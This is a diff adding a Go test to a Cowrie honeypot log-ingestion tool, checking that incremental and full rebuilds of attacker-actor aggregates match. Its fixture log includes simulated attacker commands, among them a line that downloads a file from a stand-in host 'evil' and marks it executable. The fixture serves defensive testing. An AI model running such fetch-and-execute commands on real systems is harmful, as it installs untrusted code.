@@ -181,3 +181,119 @@ func writeTempCowrieLog(t *testing.T, line string) string {
 	}
 	return path
 }
+
+// appendLine appends one JSON line to an existing cowrie log file (same inode),
+// simulating cowrie writing more events between live-ingest ticks.
+func appendLine(t *testing.T, path, line string) {
+	t.Helper()
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o644)
+	if err != nil {
+		t.Fatalf("open append: %v", err)
+	}
+	defer f.Close()
+	if _, err := f.WriteString(line + "\n"); err != nil {
+		t.Fatalf("append: %v", err)
+	}
+}
+
+// actorSnapshot is a stable, comparable view of an actor's aggregate.
+type actorSnapshot struct {
+	ID          string
+	EventCount  int
+	UniqueUsers int
+	PrimaryIP   string
+	Intent      string
+}
+
+func snapshotActors(t *testing.T, st *store.Store) map[string]actorSnapshot {
+	t.Helper()
+	actors, err := st.ListActors(1000)
+	if err != nil {
+		t.Fatalf("list actors: %v", err)
+	}
+	out := map[string]actorSnapshot{}
+	for _, a := range actors {
+		out[a.ID] = actorSnapshot{
+			ID:          a.ID,
+			EventCount:  a.EventCount,
+			UniqueUsers: a.UniqueUsers,
+			PrimaryIP:   a.PrimaryIP,
+			Intent:      a.Intent,
+		}
+	}
+	return out
+}
+
+// TestIncrementalRebuildMatchesFullRebuild is the equivalence guard for the O1
+// incremental cowrie actor rebuild: ingesting a log in several append ticks
+// (incremental path) must produce the same actor aggregates as a single
+// replace-mode ingest of the complete log (full rebuild path).
+func TestIncrementalRebuildMatchesFullRebuild(t *testing.T) {
+	lines := []string{
+		`{"eventid":"cowrie.session.connect","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"session":"s1","hassh":"hashA"}`,
+		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:01.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1","hassh":"hashA"}`,
+		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:02.000000Z","src_ip":"1.2.3.4","username":"admin","session":"s1","hassh":"hashA"}`,
+		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:00:03.000000Z","src_ip":"1.2.3.4","input":"wget http://evil/x -O /tmp/x; chmod +x /tmp/x","session":"s1","hassh":"hashA"}`,
+		// Second actor, different HASSH, different IP.
+		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:01:00.000000Z","src_ip":"5.6.7.8","username":"root","session":"s2","hassh":"hashB"}`,
+		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:01:01.000000Z","src_ip":"5.6.7.8","input":"uname -a","session":"s2","hassh":"hashB"}`,
+		// More events for actor A in a later tick.
+		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:02:00.000000Z","src_ip":"1.2.3.4","username":"git","session":"s3","hassh":"hashA"}`,
+	}
+
+	// --- Incremental path: append a few lines at a time across ticks. ---
+	incStore := openTestStore(t)
+	defer incStore.Close()
+	incPath := filepath.Join(t.TempDir(), "inc.json")
+	if err := os.WriteFile(incPath, []byte(lines[0]+"\n"+lines[1]+"\n"), 0o644); err != nil {
+		t.Fatalf("seed inc log: %v", err)
+	}
+	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
+		t.Fatalf("inc tick 1: %v", err)
+	}
+	appendLine(t, incPath, lines[2])
+	appendLine(t, incPath, lines[3])
+	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
+		t.Fatalf("inc tick 2: %v", err)
+	}
+	appendLine(t, incPath, lines[4])
+	appendLine(t, incPath, lines[5])
+	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
+		t.Fatalf("inc tick 3: %v", err)
+	}
+	appendLine(t, incPath, lines[6])
+	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
+		t.Fatalf("inc tick 4: %v", err)
+	}
+
+	// --- Full rebuild path: replace-ingest the complete log at once. ---
+	fullStore := openTestStore(t)
+	defer fullStore.Close()
+	fullPath := filepath.Join(t.TempDir(), "full.json")
+	all := ""
+	for _, l := range lines {
+		all += l + "\n"
+	}
+	if err := os.WriteFile(fullPath, []byte(all), 0o644); err != nil {
+		t.Fatalf("write full log: %v", err)
+	}
+	if _, err := IngestFile(fullStore, fullPath, nil, true); err != nil {
+		t.Fatalf("full ingest: %v", err)
+	}
+
+	inc := snapshotActors(t, incStore)
+	full := snapshotActors(t, fullStore)
+	if len(inc) != len(full) {
+		t.Fatalf("actor count mismatch: incremental=%d full=%d\ninc=%+v\nfull=%+v", len(inc), len(full), inc, full)
+	}
+	for id, fa := range full {
+		ia, ok := inc[id]
+		if !ok {
+			t.Errorf("actor %s present in full rebuild but missing from incremental", id)
+			continue
+		}
+		if ia != fa {
+			t.Errorf("actor %s aggregate mismatch:\n incremental=%+v\n full=%+v", id, ia, fa)
+		}
+	}
+}
